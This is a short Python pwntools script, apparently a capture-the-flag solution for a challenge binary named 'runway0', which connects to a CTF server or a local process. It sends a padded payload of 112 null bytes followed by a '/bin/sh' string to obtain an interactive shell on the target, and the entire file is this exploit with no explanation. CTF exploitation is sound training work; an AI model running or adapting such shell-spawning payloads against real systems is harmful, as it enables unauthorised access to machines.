#!/usr/bin/env python3

from pwn import *

exe = ELF("./runway0")

context.binary = exe


def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.pwnoh.io", 13400)

    return r


def main():
    r = conn()

    r.sendlineafter(b'!\n', 
        b'\x00'*112 + 
        b'\"/bin/sh\x00'
    )

    r.interactive()


if __name__ == "__main__":
    main()
